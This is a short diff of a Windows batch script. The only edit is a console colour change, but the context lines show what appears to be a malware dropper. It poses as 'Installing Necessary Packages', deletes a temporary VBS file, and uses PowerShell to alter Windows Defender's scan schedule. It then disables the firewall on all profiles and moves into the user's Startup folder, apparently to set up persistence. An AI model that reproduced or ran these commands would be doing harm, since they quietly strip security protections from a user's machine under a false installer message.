@@ -28,7 +28,7 @@ del %tmp%\tmp.vbs
 
 echo  Installing Necessary Packages.....Please Wait.....
 
-color 42
+color 0C
 
 cd  %temp%
 
@@ -76,4 +76,3 @@ powershell.exe -command "Set-MpPreference -ScanScheduleDay 8"
 powershell.exe -command "netsh advfirewall set allprofiles state off"
 
 cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
- 
